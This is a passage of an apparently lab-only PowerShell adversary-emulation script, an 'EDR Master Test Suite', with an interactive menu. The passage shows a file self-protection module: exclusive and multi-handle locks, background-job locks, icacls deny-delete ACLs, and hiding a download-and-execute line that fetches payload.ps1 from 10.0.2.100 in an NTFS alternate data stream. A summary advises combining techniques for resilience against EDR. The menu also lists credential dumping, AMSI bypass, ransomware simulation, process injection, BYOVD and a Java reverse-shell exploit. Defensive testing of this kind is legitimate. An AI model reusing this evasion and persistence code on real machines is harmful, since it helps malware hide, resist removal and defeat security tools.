                [System.IO.FileAccess]::ReadWrite,
                [System.IO.FileShare]::None
            )
            # Signal que le lock est actif
            $flagPath = $path + ".locked"
            [System.IO.File]::WriteAllText($flagPath, "LOCKED by PID $PID")
            # Maintenir le lock
            $timeout = 60
            $elapsed = 0
            while ($elapsed -lt $timeout) {
                Start-Sleep -Seconds 2
                $elapsed += 2
            }
            $s.Close()
            Remove-Item $flagPath -Force -ErrorAction SilentlyContinue
        } catch { }
    } -ArgumentList $bgLockFile

    Start-Sleep -Seconds 2

    $flagFile = $bgLockFile + ".locked"
    if (Test-Path $flagFile) {
        Write-OK "Background lock job active -- PID: $($lockJob.Id)"
        Write-Evidence "Lock file  : $bgLockFile"
        Write-Evidence "Flag file  : $flagFile ($(Get-Content $flagFile))"

        Write-Detail "Testing deletion while background job holds lock..."
        Try {
            Remove-Item $bgLockFile -Force -ErrorAction Stop
            Write-Fail "File deleted despite background lock"
            Log-Result "T1222" "Background job file lock" "BLOCKED" "EDR closed job handle"
        } Catch {
            Write-OK "Background lock holding -- file protected even from elevated delete"
            Write-Evidence "Error: $($_.Exception.Message)"
            Log-Result "T1222" "Background job persistent lock" "EXECUTED" "File locked by background job PID:$($lockJob.Id)"
        }

        # Cleanup job
        Stop-Job $lockJob -ErrorAction SilentlyContinue
        Remove-Job $lockJob -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
    } else {
        Write-Fail "Background job did not signal lock -- may have been killed by EDR"
        Log-Result "T1222" "Background job lock" "BLOCKED" "Job killed or flag file not created"
        Stop-Job $lockJob -ErrorAction SilentlyContinue
        Remove-Job $lockJob -Force -ErrorAction SilentlyContinue
    }

    #  TEST 13D: Multiple handles (resilience) 
    Write-Host ""
    Write-Phase "13D" "Multiple Handles (lock resilience)" "Yellow"
    Write-Detail "Technique: open N handles -- EDR must close ALL to delete"
    Write-Evidence "IOC: multiple simultaneous handles on same file from same process"

    $multiFile = "$testDir\payload_multi_locked.ps1"
    "Write-Host 'Multi-handle locked'" | Set-Content $multiFile

    $handles = @()
    $handleCount = 5
    $openCount   = 0

    1..$handleCount | ForEach-Object {
        Try {
            $h = [System.IO.File]::Open(
                $multiFile,
                [System.IO.FileMode]::Open,
                [System.IO.FileAccess]::Read,
                [System.IO.FileShare]::Read
            )
            $handles += $h
            $openCount++
        } Catch { }
    }

    Write-Evidence "$openCount / $handleCount handles opened on $multiFile"

    if ($openCount -gt 0) {
        Write-Detail "Attempting deletion with $openCount handles open..."
        Try {
            Remove-Item $multiFile -Force -ErrorAction Stop
            Write-Fail "File deleted despite $openCount open handles"
            Log-Result "T1222" "Multi-handle lock ($openCount handles)" "BLOCKED" "File deleted"
        } Catch {
            Write-OK "File protected by $openCount simultaneous handles"
            Write-Evidence "Error: $($_.Exception.Message)"
            Log-Result "T1222" "Multi-handle lock resilience" "EXECUTED" "$openCount handles -- deletion blocked"
        }
        # Fermer les handles
        $handles | ForEach-Object { Try { $_.Close() } Catch { } }
        Write-Detail "All handles closed"
    }

    #  TEST 13E: Alternate Data Stream (ADS) hiding 
    Write-Host ""
    Write-Phase "13E" "Alternate Data Stream (ADS) Hiding" "Yellow"
    Write-Detail "Technique: hide payload in NTFS ADS -- invisible in dir listing"
    Write-Evidence "IOC: file with :stream_name suffix (T1564.004)"
    Write-Evidence "MITRE: T1564.004 -- NTFS File Attributes"

    $adsFile   = "$testDir\innocent_document.txt"
    $adsStream = "$adsFile:payload"

    "This is a normal document. Nothing suspicious here." | Set-Content $adsFile
    Write-Evidence "Legitimate file created: $adsFile ($((Get-Item $adsFile).Length) bytes)"

    Try {
        # Ecrire le payload dans l'ADS
        $adsPayload = "IEX(New-Object Net.WebClient).DownloadString('http://10.0.2.100/payload.ps1')"
        Set-Content -Path $adsStream -Value $adsPayload
        Write-OK "ADS payload written: $adsStream"

        # Verifier que l'ADS est invisible
        $normalSize = (Get-Item $adsFile).Length
        Write-Evidence "File size via Get-Item   : $normalSize bytes (ADS content NOT shown)"
        Write-Evidence "File size via dir /r     : (shows stream in cmd: dir /r $adsFile)"

        # Lire le contenu de l'ADS
        $adsContent = Get-Content -Path $adsStream
        Write-Evidence "ADS content read back    : $adsContent"

        # Lister les streams
        Try {
            $streams = Get-Item $adsFile -Stream * -ErrorAction Stop
            Write-Host ""
            Write-Host "  === NTFS STREAMS ON FILE ===" -ForegroundColor Red
            foreach ($s in $streams) {
                $marker = if ($s.Stream -ne ":$DATA") { " <-- HIDDEN PAYLOAD" } else { "" }
                Write-Host "  Stream: $($s.Stream.PadRight(20)) Size: $($s.Length) bytes$marker" -ForegroundColor $(if($marker){"Yellow"}else{"White"})
            }
            Write-Host "  ===========================" -ForegroundColor Red
        } Catch { Write-Evidence "Get-Item -Stream not available on this PS version" }

        # Executer depuis l'ADS
        Write-Detail "Attempting to execute payload from ADS..."
        Try {
            $adsExec = Get-Content $adsStream
            Write-Evidence "Payload from ADS: $adsExec"
            Write-OK "ADS payload readable and executable -- steganographic hiding confirmed"
            Log-Result "T1564.004" "NTFS ADS payload hiding" "EXECUTED" "Stream: $adsStream | Payload hidden from dir listing"
        } Catch {
            Log-Result "T1564.004" "NTFS ADS payload hiding" "BLOCKED" $_.Exception.Message
        }
    } Catch {
        Write-Fail "ADS write failed: $($_.Exception.Message)"
        Log-Result "T1564.004" "NTFS ADS payload hiding" "BLOCKED" $_.Exception.Message
    }

    #  TEST 13F: DACL permission lock (icacls) 
    Write-Host ""
    Write-Phase "13F" "DACL Permission Modification (icacls)" "Yellow"
    Write-Detail "Technique: remove delete permission from file ACL"
    Write-Evidence "IOC: icacls removing delete rights -- T1222.001"

    $daclFile = "$testDir\payload_acl_protected.ps1"
    "Write-Host 'ACL protected payload'" | Set-Content $daclFile
    Write-Evidence "Test file: $daclFile"

    # Retirer la permission de suppression
    Write-Detail "Running: icacls -- deny delete for Everyone"
    $aclResult = icacls $daclFile /deny "Everyone:(D)" 2>&1
    Write-Evidence "icacls result: $aclResult"

    Write-Detail "Running: icacls -- show current ACL"
    $aclShow = icacls $daclFile 2>&1
    $aclShow | ForEach-Object { Write-Evidence "  $_" }

    Write-Detail "Attempting delete with deny ACL active..."
    Try {
        Remove-Item $daclFile -Force -ErrorAction Stop
        Write-Fail "File deleted despite DACL deny -- admin override"
        Log-Result "T1222.001" "DACL deny delete permission" "BLOCKED" "Admin bypassed DACL"
    } Catch {
        Write-OK "Delete DENIED by DACL -- ACL protection effective"
        Write-Evidence "Error: $($_.Exception.Message)"
        Log-Result "T1222.001" "DACL deny delete (icacls)" "EXECUTED" "Delete blocked by ACL"
    }

    # Cleanup: restaurer les permissions
    icacls $daclFile /remove:d "Everyone" 2>$null | Out-Null
    Remove-Item $daclFile -Force -ErrorAction SilentlyContinue

    #  TEST 13G: EDR handle force-close detection 
    Write-Host ""
    Write-Phase "13G" "EDR Handle Force-Close Detection" "Yellow"
    Write-Detail "Advanced EDRs can close handles via kernel driver to force-delete files"
    Write-Evidence "Test: open handle, check if EDR closed it without our consent"

    $monFile = "$testDir\payload_monitor.ps1"
    "Write-Host 'Monitored payload'" | Set-Content $monFile

    Try {
        $monStream = [System.IO.File]::Open(
            $monFile,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::ReadWrite,
            [System.IO.FileShare]::None
        )

        Write-Evidence "Handle opened: $($monStream.SafeFileHandle.DangerousGetHandle())"
        Write-Evidence "Handle valid : $(-not $monStream.SafeFileHandle.IsClosed)"

        # Attendre un peu et verifier si le handle est toujours valide
        Start-Sleep -Seconds 2

        $stillValid = -not $monStream.SafeFileHandle.IsClosed
        Write-Evidence "Handle still valid after 2s: $stillValid"

        if ($stillValid) {
            Write-OK "Handle NOT force-closed by EDR -- EDR cannot close our handles (no kernel driver, or driver didn't trigger)"
            Log-Result "T1222" "EDR handle force-close resistance" "EXECUTED" "Handle survived 2s -- EDR did not intervene"
        } else {
            Write-Fail "Handle was closed by external process -- EDR kernel driver closed our handle"
            Log-Result "T1222" "EDR handle force-close detection" "BLOCKED" "EDR kernel driver closed handle"
        }

        Try { $monStream.Close() } Catch { }
    } Catch {
        Write-Fail "Could not open monitor handle: $($_.Exception.Message)"
        Log-Result "T1222" "EDR handle force-close test" "BLOCKED" $_.Exception.Message
    }

    #  CLEANUP GLOBAL LOCKS 
    Write-Host ""
    Write-Detail "Releasing all file locks..."
    foreach ($lock in $global:FileLocks) {
        Try { $lock.Close(); Write-Detail "Handle closed: $($lock.Name)" } Catch { }
    }
    $global:FileLocks = @()

    # Cleanup test dir
    Start-Sleep -Milliseconds 500
    Remove-Item $testDir -Recurse -Force -ErrorAction SilentlyContinue
    Write-Detail "Test directory cleaned up"

    #  SUMMARY 
    Write-Host ""
    Write-Host "  === FILE PROTECTION SUMMARY ===" -ForegroundColor Yellow
    Write-Host "  Technique                    | Protection Level" -ForegroundColor Cyan
    Write-Host "  FileStream FileShare.None    | Strong -- blocks all user-mode delete" -ForegroundColor White
    Write-Host "  Self-lock (Read handle)      | Medium -- blocks delete, allows read" -ForegroundColor White
    Write-Host "  Background job lock          | Strong -- persists after main script" -ForegroundColor White
    Write-Host "  Multiple handles             | Very Strong -- all must be closed" -ForegroundColor White
    Write-Host "  NTFS ADS hiding              | Stealth -- file hidden from dir listing" -ForegroundColor White
    Write-Host "  DACL deny delete             | Strong -- survives handle close" -ForegroundColor White
    Write-Host "  Limitation: EDR kernel driver can force-close handles via ZwClose" -ForegroundColor DarkYellow
    Write-Host "  Counter: combine DACL + ADS + multiple handles for max resilience" -ForegroundColor DarkYellow
    Write-Host "  ===========================" -ForegroundColor Yellow
}

function Show-Banner {
    Clear-Host
    Write-Host ""
    Write-Host "  +=============================================+" -ForegroundColor Red
    Write-Host "  |   EDR MASTER TEST SUITE  v$global:Version             |" -ForegroundColor Red
    Write-Host "  |   Ransomware + Creds + Evasion + BYOVD     |" -ForegroundColor DarkRed
    Write-Host "  |   Lab use only -- authorized systems only   |" -ForegroundColor DarkRed
    Write-Host "  +=============================================+" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Host    : $env:COMPUTERNAME\$env:USERNAME" -ForegroundColor DarkGray
    Write-Host "  Time    : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" -ForegroundColor DarkGray
    Write-Host "  Log dir : $global:LogDir" -ForegroundColor DarkGray
    Write-Host ""
}

function Show-Menu {
    Write-Host "  +-------- RECON & IMPACT ----------------+" -ForegroundColor Cyan
    Write-Host "  |  [1]  Recon & Discovery   T1082/T1057  |" -ForegroundColor White
    Write-Host "  |  [2]  Credential Dumping  T1003/T1555  |" -ForegroundColor White
    Write-Host "  |  [2B] WDigest Cleartext    T1003        |" -ForegroundColor White
    Write-Host "  |  [3]  Impair Defenses     T1562        |" -ForegroundColor White
    Write-Host "  |  [4]  Ransomware Sim      T1486/T1490  |" -ForegroundColor White
    Write-Host "  |  [5]  Persistence         T1547        |" -ForegroundColor White
    Write-Host "  +-------- EVASION -----------------------+" -ForegroundColor Magenta
    Write-Host "  |  [6]  AMSI Bypass         T1562.001    |" -ForegroundColor White
    Write-Host "  |  [7]  Obfuscation         T1027        |" -ForegroundColor White
    Write-Host "  |  [8]  LOLBins             T1218        |" -ForegroundColor White
    Write-Host "  |  [9]  Process Injection   T1055        |" -ForegroundColor White
    Write-Host "  |  [10] BYOVD               T1068        |" -ForegroundColor White
    Write-Host "  |  [11] Sandbox Evasion     T1497        |" -ForegroundColor White
    Write-Host "  |  [12] Syscall/Hook Detect T1068        |" -ForegroundColor White
    Write-Host "  |  [13] File Self-Protection T1222/T1564 |" -ForegroundColor White
    Write-Host "  |  [14] EICAR Signature Tests    EICAR    |" -ForegroundColor White
    Write-Host "  |  [15] Java Rhino RCE       CVE-2011-3544|" -ForegroundColor White
    Write-Host "  +-------- ACTIONS -----------------------+" -ForegroundColor Yellow
    Write-Host "  |  [A]  RUN ALL MODULES                  |" -ForegroundColor Yellow
    Write-Host "  |  [R]  Show Report                      |" -ForegroundColor Green
    Write-Host "  |  [Q]  Quit                             |" -ForegroundColor DarkGray
    Write-Host "  +----------------------------------------+" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "  Tests: $($global:Results.Count) | " -NoNewline -ForegroundColor DarkGray
    Write-Host "EXEC: $(($global:Results|Where-Object{$_.Status-eq'EXECUTED'}).Count) | " -NoNewline -ForegroundColor Yellow
    Write-Host "BLOCKED: $(($global:Results|Where-Object{$_.Status-eq'BLOCKED'}).Count)" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Choice: " -NoNewline -ForegroundColor Cyan
}

Show-Banner
do {
    Show-Menu
    $choice = Read-Host
    switch ($choice.ToUpper().Trim()) {
        "1"  { Show-Banner; Test-Recon;            Pause-ForAudience }
        "2"  { Show-Banner; Test-Credentials;      Pause-ForAudience }
        "2B" { Show-Banner; Test-WDigestDemo;       Pause-ForAudience }
        "3"  { Show-Banner; Test-DefenseImpairment;Pause-ForAudience }
        "4"  { Show-Banner; Test-Ransomware;       Pause-ForAudience }
        "5"  { Show-Banner; Test-Persistence;      Pause-ForAudience }
        "6"  { Show-Banner; Test-AmsiBypass;       Pause-ForAudience }
        "7"  { Show-Banner; Test-Obfuscation;      Pause-ForAudience }
        "8"  { Show-Banner; Test-LOLBins;          Pause-ForAudience }
        "9"  { Show-Banner; Test-ProcessInjection; Pause-ForAudience }
        "10" { Show-Banner; Test-BYOVD;            Pause-ForAudience }
        "11" { Show-Banner; Test-SandboxEvasion;   Pause-ForAudience }
        "12" { Show-Banner; Test-Syscalls;         Pause-ForAudience }
        "13" { Show-Banner; Test-FileSelfProtection; Pause-ForAudience }
        "14" { Show-Banner; Test-EICAR;             Pause-ForAudience }
        "15" {
            Show-Banner
            Write-Host "  Java Rhino -- Enter parameters" -ForegroundColor Cyan
            Write-Host "  KALI IP   [10.0.2.100]: " -NoNewline -ForegroundColor White
            $rKali = Read-Host; if ($rKali -eq "") { $rKali = "10.0.2.100" }
            Write-Host "  LPORT     [4444]      : " -NoNewline -ForegroundColor White
            $rPort = Read-Host; if ($rPort -eq "") { $rPort = "4444" }
            Write-Host "  WEB PORT  [8080]      : " -NoNewline -ForegroundColor White
            $rWeb  = Read-Host; if ($rWeb  -eq "") { $rWeb  = "8080" }
            Write-Host "  CUSTOM CMD [optional] : " -NoNewline -ForegroundColor White
            $rCmd  = Read-Host
            Test-JavaRhino -KaliIP $rKali -LPort $rPort -WebPort $rWeb -CustomCmd $rCmd
            Pause-ForAudience
        }
        "A"  {
            Show-Banner
            Write-Host "  [*] Running all 15 modules..." -ForegroundColor Yellow
            Test-Recon; Test-Credentials; Test-WDigestDemo; Test-DefenseImpairment
            Test-Ransomware; Test-Persistence; Test-AmsiBypass
            Test-Obfuscation; Test-LOLBins; Test-ProcessInjection
            Test-BYOVD; Test-SandboxEvasion; Test-Syscalls
            Test-FileSelfProtection
            Test-EICAR
            Test-JavaRhino
            Show-FinalReport
            Pause-ForAudience
        }
        "R"  { Show-FinalReport; Pause-ForAudience }
        "Q"  { if ($global:Results.Count -gt 0) { Show-FinalReport }; Write-Host "  Bye." -ForegroundColor DarkGray }
        default { Write-Host "  Invalid -- try again" -ForegroundColor Red; Start-Sleep 1 }
    }
} while ($choice.ToUpper().Trim() -ne "Q")
